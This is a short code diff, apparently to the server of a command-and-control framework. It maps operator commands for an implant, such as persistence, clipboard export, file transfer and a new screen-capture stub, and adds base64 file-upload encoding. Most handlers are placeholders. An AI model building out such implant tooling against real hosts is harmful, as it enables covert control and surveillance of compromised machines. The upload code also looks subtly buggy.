@@ -29,7 +29,17 @@ def craft_powershell_native_command(args, command_id):
 
 
 def craft_file_upload(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
+    # Temp dev work:
+    #
+    a = value_dict['args'].split(" ")
+    local_file = a[0]
+    target_location = a[0]
+    with open (os.getcwd()+"/Storage/implant_resources/"+local_file) as file_h:
+        a = file_h.read()
+        b = base64.b64encode(a.encode()).decode()
+        final_str = base64.b64encode(target_location.encode()).decode()+"::"+b
+    # return str(value_dict['type'] + command_id)
+    return final_str
 
 
 def craft_file_download(value_dict, command_id):
@@ -73,19 +83,22 @@ def craft_invoke_module(value_dict, command_id):
 def craft_list_modules(value_dict, command_id):
     return str(value_dict['type'] + command_id)
 
+def craft_screen_capture(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 #
 preprocessing = {
     "PS": craft_sound_file,
     "CM": craft_powershell_native_command,
-    "FU": craft_file_upload,
+    "UF": craft_file_upload,
     "FD": craft_file_download,
     "EP": craft_enable_persistence,
     "SI": craft_sys_info,
     "EC": craft_export_clipboard,
     "LM": craft_load_module,
     "IM": craft_invoke_module,
-    "ML": craft_list_modules
+    "ML": craft_list_modules,
+    "SC": craft_screen_capture
     }
 
 
